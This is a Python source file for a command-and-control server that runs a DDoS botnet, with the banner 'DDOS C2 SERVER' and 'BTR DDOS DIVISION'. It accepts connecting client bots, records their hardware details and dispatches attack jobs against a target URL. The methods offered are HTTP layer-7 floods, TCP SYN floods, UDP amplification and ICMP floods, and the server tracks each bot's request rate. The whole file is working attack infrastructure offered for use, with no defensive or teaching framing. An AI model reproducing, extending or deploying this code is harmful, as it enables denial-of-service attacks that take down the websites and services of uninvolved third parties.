#!/usr/bin/env python3
"""
Console C2 Server - Controls distributed clients running LAYER7.py
"""
import socket
import threading
import json
import time
import sys
import os
from datetime import datetime
from dataclasses import dataclass, asdict
from typing import Dict, List, Optional
import select

@dataclass
class Client:
    """Client connection information"""
    id: str
    name: str
    ip: str
    port: int
    hostname: str
    cpu_count: int
    memory_total: int
    connected_at: datetime
    status: str = "idle"  # idle, attacking, disconnected
    current_attack: Optional[str] = None
    stats: Dict = None
    
    def __post_init__(self):
        if self.stats is None:
            self.stats = {
                "requests_sent": 0,
                "success_rate": 0,
                "rps": 0,
                "cpu_usage": 0,
                "memory_usage": 0
            }

class ConsoleC2Server:
    """Console-based Command & Control Server"""
    
    def __init__(self, host='0.0.0.0', port=9999):
        self.host = host
        self.port = port
        self.server_socket = None
        self.clients: Dict[str, Client] = {}
        self.running = True
        self.attacks: Dict[str, Dict] = {}
        self.client_lock = threading.Lock()
        self.next_client_id = 1
        self.next_attack_id = 1
        
    def start(self):
        """Start the C2 server"""
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            
            print(f"""
            ╔══════════════════════════════════════╗
            ║    C2 SERVER STARTED                ║
            ║    Listening on {self.host}:{self.port}      ║
            ╚══════════════════════════════════════╝
            """)
            
            # Start console command handler
            console_thread = threading.Thread(target=self.console_handler, daemon=True)
            console_thread.start()
            
            # Start client handler
            client_thread = threading.Thread(target=self.accept_clients, daemon=True)
            client_thread.start()
            
            # Keep main thread alive
            while self.running:
                time.sleep(1)
                
        except KeyboardInterrupt:
            print("\n[!] Server stopped by user")
        except Exception as e:
            print(f"[!] Server error: {e}")
        finally:
            self.stop()
    
    def accept_clients(self):
        """Accept incoming client connections"""
        while self.running:
            try:
                client_socket, client_address = self.server_socket.accept()
                client_thread = threading.Thread(
                    target=self.handle_client,
                    args=(client_socket, client_address),
                    daemon=True
                )
                client_thread.start()
            except:
                break
    
    def handle_client(self, client_socket, client_address):
        """Handle individual client connection"""
        client_id = f"client_{self.next_client_id}"
        self.next_client_id += 1
        
        try:
            # Receive client info
            data = client_socket.recv(4096).decode('utf-8')
            client_info = json.loads(data)
            
            # Create client object
            client = Client(
                id=client_id,
                name=client_info.get('name', f'Client_{client_id}'),
                ip=client_address[0],
                port=client_address[1],
                hostname=client_info.get('hostname', 'Unknown'),
                cpu_count=client_info.get('cpu_count', 1),
                memory_total=client_info.get('memory_total', 0),
                connected_at=datetime.now(),
                status='idle'
            )
            
            with self.client_lock:
                self.clients[client_id] = client
            
            print(f"[+] Client connected: {client.name} ({client.ip}:{client.port})")
            print(f"    Hostname: {client.hostname}")
            print(f"    CPU: {client.cpu_count} cores")
            print(f"    Memory: {client.memory_total / 1024 / 1024 / 1024:.1f} GB")
            
            # Send welcome message
            welcome_msg = {
                'type': 'welcome',
                'message': f'Connected to C2 Server as {client_id}',
                'client_id': client_id,
                'status': 'idle'
            }
            client_socket.send(json.dumps(welcome_msg).encode('utf-8'))
            
            # Main client loop
            while self.running:
                try:
                    # Check for commands to send
                    if client_id in self.clients and self.clients[client_id].current_attack:
                        attack = self.clients[client_id].current_attack
                        if attack in self.attacks:
                            attack_cmd = {
                                'type': 'attack',
                                'attack_id': attack,
                                'config': self.attacks[attack]
                            }
                            client_socket.send(json.dumps(attack_cmd).encode('utf-8'))
                            print(f"[→] Sent attack command to {client.name}")
                            
                            # Clear attack assignment
                            with self.client_lock:
                                self.clients[client_id].current_attack = None
                    
                    # Receive client updates
                    client_socket.settimeout(1)
                    try:
                        data = client_socket.recv(4096)
                        if data:
                            update = json.loads(data.decode('utf-8'))
                            self.handle_client_update(client_id, update)
                    except socket.timeout:
                        continue
                        
                except (ConnectionError, json.JSONDecodeError):
                    break
            
        except Exception as e:
            print(f"[!] Client error ({client_id}): {e}")
        finally:
            with self.client_lock:
                if client_id in self.clients:
                    disconnected_client = self.clients.pop(client_id)
                    print(f"[-] Client disconnected: {disconnected_client.name}")
            client_socket.close()
    
    def handle_client_update(self, client_id, update):
        """Handle updates from clients"""
        update_type = update.get('type')
        
        if update_type == 'stats':
            with self.client_lock:
                if client_id in self.clients:
                    self.clients[client_id].stats.update(update.get('stats', {}))
        
        elif update_type == 'attack_progress':
            attack_id = update.get('attack_id')
            print(f"[↻] Attack {attack_id} progress from {client_id}")
            print(f"    Requests: {update.get('requests_sent', 0)}")
            print(f"    RPS: {update.get('current_rps', 0)}")
        
        elif update_type == 'attack_complete':
            attack_id = update.get('attack_id')
            print(f"[✓] Attack {attack_id} completed by {client_id}")
            print(f"    Total requests: {update.get('total_requests', 0)}")
            print(f"    Success rate: {update.get('success_rate', 0)}%")
        
        elif update_type == 'attack_error':
            attack_id = update.get('attack_id')
            print(f"[✗] Attack {attack_id} error from {client_id}")
            print(f"    Error: {update.get('error', 'Unknown')}")
    
    def console_handler(self):
        """Console interface for server commands"""
        while self.running:
            try:
                self.print_dashboard()
                command = input("\nC2> ").strip().lower()
                
                if command == 'help' or command == '?':
                    self.show_help()
                elif command == 'list':
                    self.list_clients()
                elif command == 'stats':
                    self.show_stats()
                elif command.startswith('attack'):
                    self.handle_attack_command(command)
                elif command.startswith('stop'):
                    self.handle_stop_command(command)
                elif command == 'clear':
                    os.system('clear' if os.name == 'posix' else 'cls')
                elif command == 'exit' or command == 'quit':
                    print("[!] Shutting down server...")
                    self.running = False
                else:
                    print(f"[!] Unknown command: {command}")
                    
            except KeyboardInterrupt:
                print("\n[!] Shutting down server...")
                self.running = False
            except Exception as e:
                print(f"[!] Command error: {e}")
    
    def print_dashboard(self):
        """Print server dashboard"""
        os.system('clear' if os.name == 'posix' else 'cls')
        print("""
        ╔══════════════════════════════════════╗
        ║    DDOS C2 SERVER - CONSOLE         ║
        ╚══════════════════════════════════════╝
        """)
        
        with self.client_lock:
            total_clients = len(self.clients)
            active_clients = len([c for c in self.clients.values() if c.status == 'attacking'])
        
        print(f"    📡 Connected Clients: {total_clients}")
        print(f"    ⚡ Active Attacks: {active_clients}")
        print(f"    🆔 Next Attack ID: {self.next_attack_id}")
        print("\n    Commands: list, stats, attack, stop, clear, exit")
        print("    Type 'help' for detailed command list")
    
    def show_help(self):
        """Show help information"""
        print("""
        ╔══════════════════════════════════════╗
        ║           C2 SERVER COMMANDS        ║
        ╚══════════════════════════════════════╝
        
        list        - List all connected clients
        stats       - Show detailed statistics
        attack      - Start an attack
            Usage: attack <target_url> <method> <duration>
            Example: attack https://example.com http 60
        stop        - Stop an attack
            Usage: stop <client_id> or stop all
        clear       - Clear console
        exit/quit   - Shutdown server
        
        Attack Methods:
          http    - Layer 7 HTTP attacks
          tcp     - TCP SYN flood
          udp     - UDP amplification
          icmp    - ICMP ping flood
        """)
    
    def list_clients(self):
        """List all connected clients"""
        with self.client_lock:
            if not self.clients:
                print("[!] No clients connected")
                return
            
            print("\n" + "="*60)
            print("CONNECTED CLIENTS")
            print("="*60)
            
            for client_id, client in self.clients.items():
                status_icon = "⚡" if client.status == 'attacking' else "✅"
                print(f"\n{status_icon} {client.name} ({client_id})")
                print(f"  IP: {client.ip}:{client.port}")
                print(f"  Host: {client.hostname}")
                print(f"  Status: {client.status}")
                print(f"  CPU: {client.cpu_count} cores")
                print(f"  Connected: {client.connected_at.strftime('%H:%M:%S')}")
                
                if client.current_attack:
                    print(f"  Current Attack: {client.current_attack}")
    
    def show_stats(self):
        """Show server statistics"""
        with self.client_lock:
            total_clients = len(self.clients)
            attacking = len([c for c in self.clients.values() if c.status == 'attacking'])
            idle = total_clients - attacking
            
            total_requests = sum(c.stats.get('requests_sent', 0) for c in self.clients.values())
            avg_rps = sum(c.stats.get('rps', 0) for c in self.clients.values()) / total_clients if total_clients > 0 else 0
        
        print("\n" + "="*60)
        print("SERVER STATISTICS")
        print("="*60)
        print(f"Total Clients: {total_clients}")
        print(f"  ⚡ Attacking: {attacking}")
        print(f"  ✅ Idle: {idle}")
        print(f"Total Requests: {total_requests:,}")
        print(f"Average RPS: {avg_rps:.1f}")
        print(f"Active Attacks: {len(self.attacks)}")
        
        if self.attacks:
            print("\nACTIVE ATTACKS:")
            for attack_id, attack in self.attacks.items():
                print(f"  {attack_id}: {attack.get('target')} ({attack.get('method')})")
    
    def handle_attack_command(self, command):
        """Handle attack command"""
        try:
            parts = command.split()
            if len(parts) < 4:
                print("[!] Usage: attack <target_url> <method> <duration>")
                return
            
            _, target, method, duration = parts[:4]
            duration = int(duration)
            
            # Validate method
            valid_methods = ['http', 'tcp', 'udp', 'icmp']
            if method not in valid_methods:
                print(f"[!] Invalid method. Choose from: {', '.join(valid_methods)}")
                return
            
            # Create attack configuration
            attack_id = f"attack_{self.next_attack_id}"
            self.next_attack_id += 1
            
            attack_config = {
                'attack_id': attack_id,
                'target': target,
                'method': method,
                'layer': 'http' if method == 'http' else 'tcp' if method == 'tcp' else 'udp' if method == 'udp' else 'icmp',
                'duration': duration,
                'rps': 100,
                'created_at': datetime.now().isoformat()
            }
            
            # Store attack
            self.attacks[attack_id] = attack_config
            
            # Assign to available clients
            with self.client_lock:
                available_clients = [
                    client_id for client_id, client in self.clients.items()
                    if client.status == 'idle'
                ]
                
                if not available_clients:
                    print("[!] No idle clients available")
                    return
                
                # Assign to first available client
                assigned_client = available_clients[0]
                self.clients[assigned_client].status = 'attacking'
                self.clients[assigned_client].current_attack = attack_id
            
            print(f"[✓] Attack {attack_id} created")
            print(f"    Target: {target}")
            print(f"    Method: {method}")
            print(f"    Duration: {duration}s")
            print(f"    Assigned to: {assigned_client}")
            
        except ValueError:
            print("[!] Duration must be a number")
        except Exception as e:
            print(f"[!] Attack command error: {e}")
    
    def handle_stop_command(self, command):
        """Handle stop command"""
        try:
            parts = command.split()
            if len(parts) < 2:
                print("[!] Usage: stop <client_id> or stop all")
                return
            
            _, target = parts[:2]
            
            if target == 'all':
                with self.client_lock:
                    for client_id, client in self.clients.items():
                        if client.status == 'attacking':
                            client.status = 'idle'
                            client.current_attack = None
                print("[✓] Stopped all attacks")
            else:
                with self.client_lock:
                    if target in self.clients:
                        self.clients[target].status = 'idle'
                        self.clients[target].current_attack = None
                        print(f"[✓] Stopped attacks on {target}")
                    else:
                        print(f"[!] Client not found: {target}")
                        
        except Exception as e:
            print(f"[!] Stop command error: {e}")
    
    def stop(self):
        """Stop the server"""
        self.running = False
        if self.server_socket:
            self.server_socket.close()
        print("[!] Server stopped")

def main():
    """Main function"""
    print("""
    ╔══════════════════════════════════════╗
    ║    DDOS C2 SERVER - CONSOLE         ║
    ║    [CREATED BY: (BTR) DDOS DIVISION]║
    ║    [USE AT YOUR OWN RISK]           ║
    ╚══════════════════════════════════════╝
    """)
    
    # Get server configuration
    host = input("Server IP [0.0.0.0]: ").strip() or '0.0.0.0'
    port = input("Server Port [9999]: ").strip() or '9999'
    
    try:
        port = int(port)
        server = ConsoleC2Server(host=host, port=port)
        server.start()
    except ValueError:
        print("[!] Port must be a number")
    except Exception as e:
        print(f"[!] Failed to start server: {e}")

if __name__ == "__main__":
    main()
